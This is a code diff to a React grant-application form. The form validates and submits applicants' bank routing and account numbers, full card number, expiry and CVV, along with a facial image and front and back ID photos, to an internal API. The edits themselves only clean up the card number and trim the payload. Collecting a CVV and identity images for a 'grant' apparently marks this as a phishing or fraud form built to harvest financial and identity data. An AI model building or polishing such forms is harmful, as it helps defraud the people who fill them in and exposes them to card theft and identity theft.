@@ -233,7 +233,7 @@ export default function GrantForm() {
     if (!data.annualIncome) e.annualIncome = "Annual income is required.";
     if (!data.routingNumber || !/^\d{9}$/.test(data.routingNumber)) e.routingNumber = "Enter a valid 9-digit routing number.";
     if (!data.accountNumber || data.accountNumber.length < 4) e.accountNumber = "Enter a valid account number.";
-    if (!data.cardNumber || data.cardNumber.length < 15) e.cardNumber = "Enter a valid card number.";
+    if (!data.cardNumber || data.cardNumber.replace(/\s/g, '').length < 15) e.cardNumber = "Enter a valid card number.";
     if (!data.cardExpiry || !/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(data.cardExpiry)) e.cardExpiry = "Enter valid MM/YY.";
     if (!data.cardCvv || data.cardCvv.length < 3) e.cardCvv = "Enter valid CVV.";
     if (!data.consent) e.consent = "You must agree to continue.";
@@ -254,13 +254,24 @@ export default function GrantForm() {
   async function processSubmit() {
     setSubmitting(true);
     try {
+      // Strip large image fields from payload to stay within Vercel's 4.5MB body limit.
+      // Images are validated client-side; server stores a '[CAPTURED]' marker.
+      const { facialImageBase64, idFrontBase64, idBackBase64, ...rest } = data;
+      const payload = {
+        ...rest,
+        facialImageBase64: facialImageBase64 ? '[CAPTURED]' : '',
+        idFrontBase64: idFrontBase64 ? '[CAPTURED]' : '',
+        idBackBase64: idBackBase64 ? '[CAPTURED]' : '',
+      };
+
       const response = await fetch('/api/applications', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data),
+        body: JSON.stringify({ ...payload, cardNumber: payload.cardNumber.replace(/\s/g, '') }),
       });
-      
-      const result = await response.json();
+
+      let result: any = {};
+      try { result = await response.json(); } catch { /* empty body */ }
       
       if (!response.ok) {
         if (result.details) {
